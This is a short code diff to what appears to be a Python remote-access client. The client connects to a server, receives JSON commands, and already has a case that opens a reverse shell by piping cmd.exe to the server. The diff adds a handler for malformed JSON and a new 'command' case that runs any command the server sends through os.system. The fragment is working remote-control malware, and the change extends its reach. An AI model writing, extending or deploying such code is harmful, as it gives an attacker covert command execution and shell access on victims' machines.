@@ -39,6 +39,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             data = json.loads(sock.recv(1024).decode())
         except ConnectionResetError as e:
             quit()
+        except json.decoder.JSONDecodeError as _:
+            quit()
         match data[0]:
             case "shell": # Opens a reverse shell on the host to the server
                 p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
@@ -60,3 +62,6 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                     send_data(sock, ret)
                 except ConnectionError as e:
                     pass
+
+            case 'command':
+                os.system(data[1]) # Executes the command
